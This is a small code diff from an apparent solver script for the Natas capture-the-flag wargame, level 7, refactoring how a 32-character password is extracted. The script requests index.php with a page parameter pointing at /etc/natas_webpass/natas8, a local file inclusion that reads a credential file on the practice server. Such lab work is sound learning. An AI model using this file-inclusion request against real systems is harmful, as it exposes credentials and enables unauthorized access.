@@ -21,7 +21,5 @@ natas = libnatas.NatasBrowser(level=7, password=password)
 
 # la pass esta en index.php?page=/etc/natas_webpass/natas8
 soup = natas.get_html_soup(natas.level_url + "/index.php?page=/etc/natas_webpass/natas8")
-
-regex = re.compile('.*\W([a-zA-Z0-9]{32})\W.*')
-password_nl = regex.findall(soup.prettify())[0]
+password_nl = natas.get_password(soup.prettify(), '.*\W([a-zA-Z0-9]{32})\W.*')
 natas.print_password(password_nl)
